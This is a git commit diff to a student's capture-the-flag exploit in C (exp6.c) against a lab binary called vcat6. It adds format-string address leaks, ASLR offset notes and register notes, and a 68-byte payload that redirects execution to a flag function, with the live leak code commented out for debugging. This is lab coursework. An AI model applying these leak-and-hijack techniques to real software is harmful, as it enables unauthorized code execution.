27e877f90429652d34dd26ea56920a134c5a0393
ebielawa <edward_bielawa@brown.edu>
2022-11-26 01:00:38 -0500

    Flag 1 Test

--- ctf-4/exp6.c
+++ ctf-4/exp6.c
@@ -13,11 +13,37 @@
 #include <string.h>
 #include <unistd.h>
 
-#define	BUF_SZ			sizeof("0x00000000")
-#define	FMT_STR			"%1$p%1$p"
-#define	BIN_BASE_OFF		0x0
-#define	LIBC_BASE_OFF		0x0
+// At the time of our hijacking the registers are (in debug mode):
+// EAX: 0x4100155e (address of fmt_plain) -- 0x155e from start of vcat binary
+// EBX: 0x41004000 (.got.plt) -- 0x4000 from start of vcat binary
+// ECX: 0xbffffd5c (address of buffer on stack) -- can leak a stack value
+// EDX: 0x0000004c (some value)
 
+// ESI: 0xb7f72000 (some address in libc)
+// EDI: 0xb7f72000 (some address in libc)
+// EBP: 0xbffffda8 (stack address) -- can leak a stack value
+// ESP: 0xbffffd40 (stack address) -- can leak a stack value or pivot back
+
+#define	BUF_SZ			sizeof("0x00000000")
+// Format string leaks the base address of the file
+#define	FMT_STR			"%4$p%30$p%5$p"
+// Otherwise %24$p (or %23$p) will leak something 4000 (or 5000) bytes above the base address
+// %30$p (or %34$p) will leak some libc address
+// %5$p leaks a stack address
+
+#define	BIN_BASE_OFF		0x0
+#define	LIBC_BASE_OFF		0x1ae46
+#define STACK_BASE_OFF		0x20d98
+#define got_plt_OFF			0x2f20
+
+#define mgk1_OFF			0x600c
+#define mgk2_OFF			0x6010
+#define rnd1_OFF			0x5004
+#define rnd2_OFF			0x5008
+
+#define flag1_OFF			0x1239
+
+// We have exactly 64 bytes to work with in our payload (it's 68 bytes total)
 unsigned char payload[] =
 	/* ------------------------------------	*/
 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
@@ -38,31 +64,51 @@ main(int argc, char **argv)
 	/* base address of 'libc-2.31.so'	*/
 	unsigned long	laddr;
 
+	/* base address of the stack	*/
+	unsigned long staddr;
+
 	/* helper				*/
 	struct stat	istat;
 
 	/* cleanup				*/
 	memset(buf, 0, BUF_SZ);
 
-	/* leak the base address of `vcat6'	*/
-	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
+	/* DEBUG MODE ONLY: */
+	baddr = 0x41000000;
+	laddr = 0xb7d8d000;
+	staddr = 0xbffdf000;
 
-	/* leak the base address of 'libc-2.31.so'	*/
-	read(STDIN_FILENO, buf, BUF_SZ-1);
-	laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
+	/* For NON-DEBUG MODE ONLY:	*/
 
-	/* sanity check 			*/
-	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
-		if (!baddr || !laddr) {
-			fprintf(stderr,
-				"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
-			fprintf(stderr,
-				"[!] If you are debugging your exploit under GDB "
-				"you need to type in the leaked addresses\n");
-		}
-	}
+	// /* leak the base address of `vcat6'	*/
+	// write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
+
+	// /* leak the base address of 'libc-2.31.so'	*/
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
+
+	// /* leak the base address of the stack	*/
+	// read(STDIN_FILENO, buf, BUF_SZ-1);
+	// staddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
+
+	// /* sanity check 			*/
+	// if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
+	// 	if (!baddr || !laddr) {
+	// 		fprintf(stderr,
+	// 			"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
+	// 		fprintf(stderr,
+	// 			"[!] If you are debugging your exploit under GDB "
+	// 			"you need to type in the leaked addresses\n");
+	// 	}
+	// }
+
+	/* Time to create the payload!!!!	*/
+	unsigned long addr_aslr;
+	addr_aslr = baddr + flag1_OFF;
+
+	memcpy(payload + 64, &addr_aslr, sizeof(addr_aslr));
 
 	/*
 	 * dump the payload in 'stdout'
